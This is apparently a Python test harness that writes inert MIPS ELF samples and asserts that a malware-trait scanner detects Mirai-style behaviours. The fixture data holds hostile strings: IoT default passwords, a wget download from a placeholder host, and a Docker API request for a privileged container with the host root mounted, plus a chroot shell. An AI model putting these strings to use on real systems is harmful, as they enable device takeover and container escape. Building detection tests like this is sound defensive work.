"""Inert ELF controls for the MIPS second-review trait corrections."""
import argparse
import json
import os
from pathlib import Path
import runpy
import struct
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
elf = runpy.run_path(str(ROOT / 'testdata/taxonomy/mirai-native-review/check.py'))['elf']
XOR = 'micro-behaviors/data/decode/xor::mips-xor-digit-dot-decode-loop'
QUERY = 'micro-behaviors/communications/http/query::native-command-query-parameter'
CREDS = 'objectives/lateral-movement/brute-force/iot-creds::'
DOCKER = 'objectives/lateral-movement/exploit/container::docker-api-privileged-host-chroot'
SOCKET = 'micro-behaviors/communications/socket/syscall::'
RAW = 'micro-behaviors/os/syscall/raw::'


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--cleave', default=os.environ.get('CLEAVE', 'cleave'))
    parser.add_argument('--scratch', required=True)
    args = parser.parse_args()
    cases = []

    def case(name, code=b'', data=b'', yes=(), no=(), sectionless=False, endian='>'):
        content = bytearray(elf(rodata=data, code=code, machine=8, endian=endian))
        if sectionless:
            struct.pack_into('>I', content, 32, 0)
            struct.pack_into('>HH', content, 48, 0, 0)
        cases.append((name, bytes(content), set(yes), set(no)))

    # Dot constant, loaded-byte XOR, ASCII digit bounds, two-byte input
    # advance and single-byte output store. No entry point or network action.
    loop = bytes.fromhex(
        '24 15 00 2E 00 00 00 00 '
        '93 A3 00 27 02 03 18 26 7C 03 24 20 10 95 00 04 '
        '24 63 FF D0 2C 63 00 0A 10 60 00 23 00 00 00 00 '
        '02 36 28 21 24 03 00 15 26 D6 00 01 27 DE 00 02 '
        '16 C3 FF E3 A0 A4 00 00')
    case('decoder.elf', code=loop, yes=[XOR])
    variant = loop.replace(bytes.fromhex('93 A3 00 27'), bytes.fromhex('93 A3 00 33'))
    variant = variant.replace(bytes.fromhex('24 03 00 15'), bytes.fromhex('24 03 00 3F'))
    case('decoder-variant.elf', code=variant, yes=[XOR])
    case('no-xor.elf', code=loop.replace(bytes.fromhex('02 03 18 26'), bytes(4)), no=[XOR])
    case('no-dot.elf', code=loop.replace(bytes.fromhex('24 15 00 2E'), bytes(4)), no=[XOR])
    case('decoder-data.elf', data=loop, no=[XOR])
    case('wrong-endian.elf', code=loop, endian='<', no=[XOR])
    syscalls = bytes.fromhex('24 02 10 57 00 00 00 0C 24 02 10 4A 00 00 00 0C')
    raw_ids = {SOCKET + 'mips-direct-socket-syscall-be-sectionless',
               SOCKET + 'mips-direct-connect-syscall-be-sectionless',
               RAW + 'mips-direct-syscall-instruction-be-sectionless'}
    section_ids = {SOCKET + 'mips-direct-socket-syscall-be',
                   SOCKET + 'mips-direct-connect-syscall-be',
                   RAW + 'mips-direct-syscall-instruction-be'}
    case('sectioned.elf', code=syscalls, yes=section_ids, no=raw_ids)
    case('sectionless.elf', code=syscalls, sectionless=True, yes=raw_ids, no=section_ids)
    case('cmd-query.elf', data=b'GET /api?cmd=%s HTTP/1.0\r\n\0', yes=[QUERY],
         no=['objectives/execution/exploit/network-service/command-execution::native-exploit-command-marker'])
    case('cmd-query-uppercase.elf', data=b'GET /api?CMD=%s HTTP/1.0\r\n\0', yes=[QUERY])
    case('credentials-proxy-download.elf',
         data=b'xc3511\0juantech\0SOCKS5 on :%d\0/proc/self/exe\0wget -qO out http://example.test/file\0',
         yes=[CREDS + 'iot-default-credentials-with-proxy-banner',
              CREDS + 'iot-default-credentials-with-downloader'])
    case('docker-admin.elf',
         data=b'{"HostConfig":{"Binds":["/:/mnt/h"],"Privileged":true}}\0POST /containers/create\0POST /containers/%s/start\0chroot /mnt/h /bin/sh /tmp/admin\0',
         yes=[DOCKER])

    with tempfile.TemporaryDirectory(prefix='mips-review-', dir=args.scratch) as tmp:
        paths = []
        for name, content, _, _ in cases:
            path = Path(tmp) / name
            path.write_bytes(content)
            paths.append(str(path))
        result = subprocess.run([args.cleave, '--traits-dir', str(ROOT),
                                 '--format', 'json', *paths],
                                capture_output=True, text=True, check=True)
        decoder = json.JSONDecoder()
        output = result.stdout.strip()
        files = {}
        while output:
            report, end = decoder.raw_decode(output)
            files.update({Path(f['path']).name: f for f in report['files']})
            output = output[end:].strip()
        for name, _, yes, no in cases:
            traits = {t['id']: t for t in files[name]['traits']}
            assert yes <= traits.keys(), (name, 'missing', yes - traits.keys())
            assert not no & traits.keys(), (name, 'unexpected', no & traits.keys())
            assert not [t['id'] for t in traits.values() if t['crit'] == 5], name
            if name == 'credentials-proxy-download.elf':
                assert all(traits[t]['crit'] == 4 for t in yes)
            if name == 'docker-admin.elf':
                assert traits[DOCKER]['crit'] == 4
    print(f'{len(cases)} MIPS second-review controls passed')


if __name__ == '__main__':
    main()
